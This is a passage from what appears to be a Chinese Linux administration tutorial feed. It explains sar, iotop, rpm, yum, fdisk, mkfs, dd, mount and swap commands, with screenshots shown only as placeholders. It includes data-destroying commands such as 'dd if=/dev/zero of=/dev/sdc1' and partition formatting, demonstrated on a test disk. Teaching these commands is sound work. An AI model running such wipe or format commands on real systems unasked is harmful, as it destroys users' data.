svctm，说明I/O 队列太长，io响应太慢，则需要进行必要优化。如果avgqu-sz比较大，也表示有当量io在等待。</p><p><strong>5、只查看cpu的信息</strong></p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> <strong>八、iotop：动态显示磁盘I/O统计信息</strong></p><p><strong>命令详解：</strong></p><p>iptop命令是一款实时监控磁盘I/O的工具，必须以root身份运行，使用iotop命令可以很方便地查看每个进程使用磁盘I/O的情况</p><p><strong>1、不接任何参数启动iotop命令</strong></p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> Total DISK READ：总磁盘读取速度</p><p>Total DISK WRITE：总磁盘读取速度</p><p>TID：进程pid值 PRIO：优先级</p><p>USER：用户</p><p>DISK READ：磁盘读取速度</p><p>DISK WRITE：磁盘写入速度</p><p>SWAPIN：从swap分区读取数据占用的百分比</p><p>I/O：I/O占用的百分比</p><p>COMMAND：消耗I/O的进程名</p><p><strong>九、sar：收集系统信息</strong></p><p><strong>命令详解：</strong></p><p>通过sar命令，可以全面地获取系统的CPU、运行队列、磁盘I/O、分页（交换区）、内存、CPU中断和网络等硬盘信息</p><p><strong>1、sar -u 2 3 #-u显示系统所有cpu的负载状态，2，3代表每2秒统计一次，共统计3次</strong></p><p><img src="640-1689663863777-27.png" alt="图片"></p><p> %user：CPU处在用户模式下的时间百分比</p><p>%nice：CPU处在带NICE值的用户模式下的时间百分比<br>%system：CPU处在系统模式下的时间百分比<br>%iowait：CPU等待输入输出完成时间的百分比<br>%steal：管理程序维护另一个虚拟处理器时，虚拟CPU的无意识等待时间百分比<br>%idle：CPU空闲时间百分比</p><p> <strong>2、显示运行队列的大小</strong></p><p>sar -q 2 3 #使用-q选项显示运行队列的大小</p><p><img src="640-1689663865498-30.png" alt="图片"></p><p> runq-sz 运行队列的长度（等待运行的进程数，每核的CP不能超过3个）</p><p>plist-sz 进程列表中的进程（processes）和线程数（threads）的数量<br>ldavg-1 最后1分钟的CPU平均负载，即将多核CPU过去一分钟的负载相加再除以核心数得出的平均值，5分钟和15分钟以此类推<br>ldavg-5 最后5分钟的CPU平均负载<br>ldavg-15 最后15分钟的CPU平均负载</p><p> <strong>3、显示系统内存的使用状况</strong></p><p>sar -r 2 3 #使用-r选项显示系统内存在采样时间内的使用情况</p><p><img src="640-1689663867228-33.png" alt="图片"></p><p>kbmemfree 空闲的物理内存大小</p><p>kbmemused 使用中的物理内存大小<br>%memused 物理内存使用率<br>kbbuffers 内核中作为缓冲区使用的物理内存大小，kbbuffers和kbcached:这两个值就是free命令中的buffer和cache.<br>kbcached 缓存的文件大小<br>kbcommit 保证当前系统正常运行所需要的最小内存，即为了确保内存不溢出而需要的最少内存（物理内存+Swap分区）<br>commit 这个值是kbcommit与内存总量（物理内存+swap分区）的一个百分比的值</p><p> <strong>4、显示缓冲区的使用情况</strong></p><p>sar -b 2 3 #使用-b显示缓冲区在采样时间内的使用情况</p><p><img src="640-1689663868996-36.png" alt="图片"></p><p>tps 磁盘每秒钟的IO总数，等于iostat中的tps<br>rtps 每秒钟从磁盘读取的IO总数<br>wtps 每秒钟从写入到磁盘的IO总数<br>bread/s 每秒钟从磁盘读取的块总数<br>bwrtn/s 每秒钟此写入到磁盘的块总数</p><p><strong>5、显示网络的运行状态</strong></p><p>sar -n DEV 2 3 #使用-n DEV显示网络接口信息</p><p><img src="640-1689663870506-39.png" alt="图片"></p><p>#IFACE 本地网卡接口的名称<br>#rxpck/s 每秒钟接受的数据包<br>#txpck/s 每秒钟发送的数据库<br>#rxKB/S 每秒钟接受的数据包大小，单位为KB<br>#txKB/S 每秒钟发送的数据包大小，单位为KB<br>#rxcmp/s 每秒钟接受的压缩数据包<br>#txcmp/s 每秒钟发送的压缩包<br>#rxmcst/s 每秒钟接收的多播数据包</p><p>sar -n EDEV 2 3 #-n EDEV显示网络错误的统计数据</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p>IFACE 网卡名称<br>rxerr/s 每秒钟接收到的损坏的数据包<br>txerr/s 每秒钟发送的数据包错误数<br>coll/s 当发送数据包时候，每秒钟发生的冲撞（collisions）数，这个是在半双工模式下才有<br>rxdrop/s 当由于缓冲区满的时候，网卡设备接收端每秒钟丢掉的网络包的数目<br>txdrop/s 当由于缓冲区满的时候，网络设备发送端每秒钟丢掉的网络包的数目<br>txcarr/s 当发送数据包的时候，每秒钟载波错误发生的次数<br>rxfram 在接收数据包的时候，每秒钟发生的帧对其错误的次数<br>rxfifo 在接收数据包的时候，每秒钟缓冲区溢出的错误发生的次数<br>txfifo 在发生数据包 的时候，每秒钟缓冲区溢出的错误发生的次数</p><p><strong>6、查看系统磁盘的读写性能</strong></p><p>sar -d 2 3 #-d显示系统所有硬盘设备在采样时间内的使用情况</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p>DEV 磁盘设备的名称，如果不加-p，会显示dev253-0类似的设备名称，因此加上-p显示的名称更直接<br>tps：每秒I/O的传输总数<br>rd_sec/s 每秒读取的扇区的总数<br>wr_sec/s 每秒写入的扇区的总数<br>avgrq-sz 平均每次次磁盘I/O操作的数据大小（扇区）<br>avgqu-sz 磁盘请求队列的平均长度<br>await 从请求磁盘操作到系统完成处理，每次请求的平均消耗时间，包括请求队列等待时间，单位是毫秒（1秒等于1000毫秒），等于寻道时间+队列时间+服务时间<br>svctm I/O的服务处理时间，即不包括请求队列中的时间<br>%util I/O请求占用的CPU百分比，值越高，说明I/O越慢</p><p><strong>十、ntsysv：管理开机服务</strong></p><p><strong>命令详解：</strong></p><p>提供基于文本界面的菜单编辑操作方式，以设置不同运行级别下的系统启动状态</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> <strong>十一、setup：系统管理工具</strong></p><p><strong>命令详解：</strong></p><p>一个基于文本界面的系统管理工具，集成了用户认证管理、防火墙管理、网络管理和系统管理。</p><p><strong>1、安装：yum -y install setuptool</strong></p><p><strong>2、进行set交互界面</strong></p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> <img src="640-1689663873197-42.png" alt="图片"></p><p> <strong>十二、ethtool：查看网卡参数</strong></p><p><strong>1、查询网卡的基础参数</strong></p><p>ethtool ens33</p><p><img src="640-1689663876851-45.png" alt="图片"></p><p> <strong>十三、mii-tool：管理网络接口的状态</strong></p><p><strong>1、查看网络接口状态</strong></p><p>mii-tool ens33 #不加参数，显示精简信息</p><p><img src="640-1689663879548-48.png" alt="图片"></p><p> mii-tool -v ens33 #-v显示详细信息</p><p><img src="640-1689663880869-51.png" alt="图片"></p><p> <strong>十四、dmidecode：查询系统硬件信息</strong></p><p><strong>1、查看服务器型号</strong></p><p>dmidecode -s system-product-name #查看服务器型号</p><p><img src="640-1689663882864-54.png" alt="图片"></p><p> <strong>2、dmidecode -s system-serial-number #查看序列号关键字</strong></p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> <strong>3、dmidecode -t memory|more #查看内存信息</strong></p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> <strong>十五、ispci：显示所有PCI设备</strong></p><p><strong>1、显示所有pci设备</strong></p><p>lspci #显示所有pci设备</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> <strong>2、显示网卡设备信息</strong></p><p>lspci -s 02:01.0 #从以上信息得到网卡设备编号</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> <strong>十六、ipcs：显示进程间同信息设施的状态</strong></p><p><strong>1、显示进程间的通信状态</strong></p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> <strong>十七、ipcrm：清除ipc相关信息</strong></p><p>ipcrm -s 0 #清除semid为0的信号集</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> <strong>十八、rpm：RPM包管理器</strong></p><p>命令详解：</p><p>rpm=Red Hat Package Manager(Red Hat管理器)，几乎所有的Liunx发行版本都使用了这种形式的命令管理、安装、更新和卸载软件</p><p>rpm包含五种基础命令：安装、卸载、升级、查询和验证</p><p><strong>1、查看rpm包信息</strong></p><p>rpm -qpi 389-ds-base-snmp-1.3.10.2-6.el7.x86_64.rpm #显示rpm包的版本，创建日期等信息</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> <strong>2、 查看rpm包内容</strong></p><p>rpm -qpl 389-ds-base-snmp-1.3.10.2-6.el7.x86_64.rpm #显示rpm包内的文件</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> <strong>3、查看rpm包的依赖</strong></p><p>rpm -qpR 389-ds-base-snmp-1.3.10.2-6.el7.x86_64.rpm #查看安装次rpm包需要依赖的文件</p><p><img src="640-1689663885674-57.png" alt="图片"></p><p> <strong>4、rpm -ivh 389-ds-base-snmp-1.3.10.2-6.el7.x86_64.rpm #-h查看安装时的进度</strong></p><p><img src="640-1689663887603-60.png" alt="图片"></p><p> <strong>5、查看系统是否安装指定的rpm包</strong></p><p>rpm -qa yum #接软件名</p><p><img src="640-1689663889006-63.png" alt="图片"></p><p> <strong>6、卸载rmq包</strong></p><p>rpm -e lsof #卸载软件包</p><p><img src="640-1689663890478-66.png" alt="图片"></p><p> <strong>十九、yum：自动化RPM包管理工具</strong></p><p>命令详解：</p><p>yum=yellow dog updater modified，是多个Liunx发行版的软件包管理，如Redhat、Centos、Fedora，yum主要用于自动安装、升级rpm软件包，它能自动查找并解决rpm包之前的依赖关系。</p><p><strong>1、安装lsof软件包</strong></p><p>yum -y install lsof</p><p><img src="640-1689663891914-69.png" alt="图片"></p><p> <strong>2、检查安装列表</strong></p><p>yum list lsof</p><p><img src="640-1689663896356-72.png" alt="图片"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux 磁盘与文件系统管理</title>
    <link href="/2023/07/18/Linux-%E7%A3%81%E7%9B%98%E4%B8%8E%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/"/>
    <url>/2023/07/18/Linux-%E7%A3%81%E7%9B%98%E4%B8%8E%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>文档目录：</p><p>一、fdisk：磁盘分区工具</p><p>二、partprobe：更新内核的硬盘分区表信息</p><p>三、tune2fs：调整ext2/ext3/ext4文件系统参数</p><p>四、parted：磁盘分区工具</p><p>五、mkfs：创建Liunx文件系统</p><p>六、dumpe2fs：导出ext2/ext3/ext4文件系统信息</p><p>七、resize2fs：调整ext2/ext3/ext4文件系统大小</p><p>八、fsck：检查并修复Liunx文件系统</p><p>九、dd：转换或复制文件</p><p>十、mount：挂载文件系统</p><p>十一、umount：卸载文件系统</p><p>十二、df：报告文件系统磁盘空间的使用情况</p><p>十三、mkswap：创建交换分区</p><p>十四、swapon：激活交换分区</p><p>十五、swapoff：关闭交换分区</p><p>十六、sync：刷新文件系统缓冲区</p><p><strong>一、fdisk：磁盘分区工具(仅可分区小于2T的磁盘)</strong></p><p>1、fdisk -l #显示磁盘分区列表</p><p><img src="640.png" alt="图片"></p><p> 2、fdisk -l /dev/sda #查看指定分区的信息</p><p><img src="640-1689663598357-3.png" alt="图片"></p><p> 3、fdisk /dev/sdb #交互式分区</p><p><img src="640-1689663599819-6.png" alt="图片"></p><p><img src="640-1689663601662-9.png" alt="图片"></p><p> <img src="640-1689663603415-12.png" alt="图片"></p><p> <img src="640-1689663605734-15.png" alt="图片"></p><p> 4、mkfs.ext4 /dev/sdb1 #格式化磁盘，格式化后才能挂载到系统使用</p><p><img src="640-1689663607404-18.png" alt="图片"></p><p> 5、mount /dev/sdb1 /mnt/ #mount挂载磁盘</p><p> <img src="640-1689663608982-21.png" alt="图片"></p><p> 更正：上述语句中参数为defaults</p><p> 注意事项：fdisk中d操作为删除分区，谨慎操作，q可退出，w会报错所有设置</p><p><strong>二、partprobe：更新内核的硬盘分区表信息</strong></p><p>partprobe /dev/sdb #不重启情况下，更新内核中硬盘分区</p><p><strong>三、tune2fs：调整ext2/ext3/ext4文件系统参数</strong></p><p>1、tune2fs -l /dev/sdb1|grep -i Mount #查看sdb1设备的挂载次数</p><p><img src="640-1689663610751-24.png" alt="图片"></p><p> 2、tune2fs -C 30 /dev/sdb1 #设置挂载次数</p><p><img src="640-1689663612444-27.png" alt="图片"></p><p> 3、tune2fs -c 40 /dev/sdb1 #设置强制自检的挂载次数</p><p><img src="640-1689663614122-30.png" alt="图片"></p><p> 4、tune2fs -i 10 /dev/sdb1 #设置每10天检查一次 </p><p><img src="640-1689663615571-33.png" alt="图片"></p><p> <strong>四、parted：磁盘分区工具（大于2T）</strong></p><p>1、parted #交互模式 ，h帮助，quit退出</p><p><img src="640-1689663617388-36.png" alt="图片"></p><p> 2、parted -l #显示所有磁盘分区情况</p><p><img src="640-1689663619196-39.png" alt="图片"></p><p> 3、parted /dev/sdb #使用parted进行分区</p><p>parted /dev/sdb #使用parted进行分区</p><p><img src="640-1689663621464-42.png" alt="图片"></p><p><img src="640-1689663623283-45.png" alt="图片"></p><p>reboot后查看分区情况df -h</p><p><img src="640-1689663625476-48.png" alt="图片"></p><p><strong>五、mkfs：创建Liunx文件系统</strong></p><p>1、ls /sbin/mkfs* #下面所列是各种创建不同文件系统的命令</p><p><img src="640-1689663628093-51.png" alt="图片"></p><p> 2、mkfs -t ext4 -v /dev/sdc #-t指定文件系统类型 -v详细过程</p><p><img src="640-1689663629870-54.png" alt="图片"></p><p> 3、mkfs.ext4 /dev/sdc #通过mkfs.ext4创建文件系统（简洁写法，效果同上）</p><p><img src="640-1689663631733-57.png" alt="图片"></p><p><strong>六、dumpe2fs：导出ext2/ext3/ext4文件系统信息</strong></p><p>1、dumpe2fs /dev/sdc|egrep -i ‘incode size|incode count’ #查看系统的incode信息（暂无）</p><p><img src="640-1689663633931-60.png" alt="图片"></p><p>2、df -i #查看系统incode使用情况</p><p><img src="640-1689663635114-63.png" alt="图片"></p><p> 3、dumpe2fs /dev/sdb1|egrep -i “block size|block count” #查看block信息</p><p><img src="640-1689663637339-66.png" alt="图片"></p><p><strong>七、resize2fs：调整ext2/ext3/ext4文件系统大小</strong></p><p>背景：将两个磁盘200M的分区sdc1，sdc2合并成一个分区，如下为分区信息、挂载信息、相应文件</p><p><img src="640-1689663638866-69.png" alt="图片"></p><p>卸载已挂载的磁盘</p><p> <img src="640-1689663640739-72.png" alt="图片"></p><p> 删除分区，重新分区，起始和结束的柱面需要同上次分区一致</p><p><img src="640-1689663642024-75.png" alt="图片"></p><p> <strong>resize2fs /dev/sdc1 #在线调整磁盘大小</strong></p><p><img src="640-1689663644076-78.png" alt="图片"></p><p> 查看文件原sdc1中文件存在，原sdc2中内容丢失</p><p><img src="640-1689663646488-81.png" alt="图片"></p><p><strong>八、fsck：检查并修复Liunx文件系统（文件系统必须是卸载状态）</strong></p><p>1、开机正常工作的情况下请勿使用fsck来检查磁盘，会可能导致正常的磁盘发生故障</p><p>2、/etc/fstab中最后一列数字为1或2时，党系统开机时会读取fsck对这些系统磁盘进行自检</p><p>3、已挂载的文件系统上执行fsck等磁盘修复命令，可能导致故障</p><p><strong>九、dd：转换或复制文件</strong></p><p>1、dd if=/dev/sdc1 of=dev_sdc1.img #从/deb/sdc1中读取数据，of输出到当前目录的dev_sdc1.img(复制/备份文件)</p><p><img src="640-1689663648146-84.png" alt="图片"></p><p> 2、dd if=/dev/zero of=/dev/sdc1 #/dev/zero是一个特殊的设备，相当于什么都没有，从/dev/zero读取数据，覆盖/dev/sdc1的数据（删除分区数据）</p><p><img src="640-1689663650025-87.png" alt="图片"></p><p> 3、dd if=dev_sdc1.img of=/dev/sdc1 #使用备份恢复被删除分区数据</p><p><img src="640-1689663651478-90.png" alt="图片"></p><p> 4、dd if=/dev/zero of=test.data bs=1M count=2 #从zero读取数据写入test.data，生成test.data文件为bs<em>count=1M</em>2=2M（生成测试文件）</p><p><img src="640-1689663653211-93.png" alt="图片"></p><p>5、dd if=test.txt conv=ucase of=test.txt_U #利用conv参数设置ucase将小写转化为大写</p><p><img src="640-1689663654615-96.png" alt="图片"></p><p><strong>十、mount：挂载文件系统</strong></p><p>1、mount #显示系统已挂载信息（等同于mount -l）</p><p><img src="640-1689663660822-99.png" alt="图片"></p><p> 2、mount /dev/cdrom /mnt/ #对系统光驱进行挂载，没有指定-t iso9660，但是系统自动识别</p><p><img src="640-1689663662365-102.png" alt="图片"></p><p> 3、mount -o remount,rw / #remount尝试重新挂载跟’/‘为rw读写，当系统只读故障时，-0 使用性能及安全挂载</p><p> 4、mount -a #读取/etc/fstab机型挂载测试，如果能挂载成功，重启一般也正常</p><p><strong>十一、umount：卸载文件系统</strong></p><p>1、umount /mnt #卸载已挂载的光盘</p><p><img src="640-1689663663730-105.png" alt="图片"></p><p> 2、umount -lf /mnt/ #强制卸载</p><p><img src="640-1689663665187-108.png" alt="图片"></p><p><strong>十二、df：报告文件系统磁盘空间的使用情况</strong></p><p>1、df #显示所有磁盘的使用情况</p><p><img src="640-1689663666768-111.png" alt="图片"></p><p> 2、df /boot/ #查看具体分区所挂在的磁盘上情况</p><p><img src="640-1689663668523-114.png" alt="图片"></p><p> 3、df -h #容量使用 k/M/G人类可读的显示方式</p><p><img src="640-1689663669866-117.png" alt="图片"></p><p> 4、df -ih #-i查看inode的使用情况</p><p><img src="640-1689663671226-120.png" alt="图片"></p><p> 5、df -t ext4 #显示指定类型的磁盘</p><p><img src="640-1689663672743-123.png" alt="图片"></p><p> 6、df -T #-T显示文件系统的类型</p><p><img src="640-1689663673895-126.png" alt="图片"></p><p><strong>十三、mkswap：创建交换分区</strong></p><p>1、mkswap /dev/sdc #默认是不可以使用整块磁盘做交换分区</p><p><img src="640-1689663675599-129.png" alt="图片"></p><p> 2、mkswap -f /dev/sdc #使用-f强制使用整块磁盘做交换分区</p><p><img src="640-1689663677704-132.png" alt="图片"></p><p> <em>后续操作见命令swapon</em></p><p><strong>十四、swapon：激活交换分区</strong></p><p>1、swapon /dev/sdc #激活swap分区</p><p><img src="640-1689663679786-135.png" alt="图片"></p><p> 2、swapon -s #查看交换分区</p><p><img src="640-1689663681756-138.png" alt="图片"></p><p><strong>十五、swapoff：关闭交换分区、</strong></p><p>1、swapoff /dev/sdc #关闭/dev/sdc的交换分区</p><p><img src="640-1689663683184-141.png" alt="图片"></p><p> 2、swapoff -a 